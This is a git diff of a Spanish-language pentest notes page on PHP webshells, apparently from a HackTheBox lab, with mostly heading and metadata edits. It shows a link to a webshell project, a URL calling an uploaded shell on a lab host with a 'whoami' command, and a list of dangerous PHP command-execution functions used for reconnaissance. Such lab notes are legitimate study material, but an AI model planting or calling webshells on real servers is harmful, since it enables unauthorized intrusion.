@@ -1,5 +1,6 @@
 ---
 title: PHP Webshell
+id: php-webshell
 ---
 
 https://github.com/flozz/p0wny-shell
@@ -25,7 +26,7 @@ https://github.com/flozz/p0wny-shell
 
 http://hospital.htb:8080/uploads/cmd.phar?cmd=whoami
 
-##### Versión php
+## Versión php
 
 ```php
 <?php
@@ -37,7 +38,7 @@ http://hospital.htb:8080/uploads/cmd.phar
 
 ![](./img/php_ver.png)
 
-##### Funciones peligrosas
+## Funciones peligrosas
 ```php
 <?php
   $dangerous_functions = array("exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec");
